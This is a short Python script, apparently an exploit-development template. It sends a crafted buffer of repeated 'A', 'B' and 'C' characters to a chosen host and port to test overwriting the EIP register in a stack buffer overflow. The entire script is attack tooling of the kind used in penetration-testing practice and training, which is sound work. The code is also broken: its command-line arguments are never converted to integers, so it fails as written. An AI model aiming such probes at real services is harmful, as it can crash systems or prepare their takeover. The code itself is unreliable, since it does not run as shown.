import socket
import time
import sys

if len(sys.argv) < 5:
    print("usage: \"python target.py [host] [port] [size] [eip]\"")
    exit(0)

host = sys.argv[1]
port = sys.argv[2]
size = sys.argv[3]
eip = sys.argv[4]

inputBuffer = "A" * eip + "B" * 4 + "C" * (size-eip)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
     



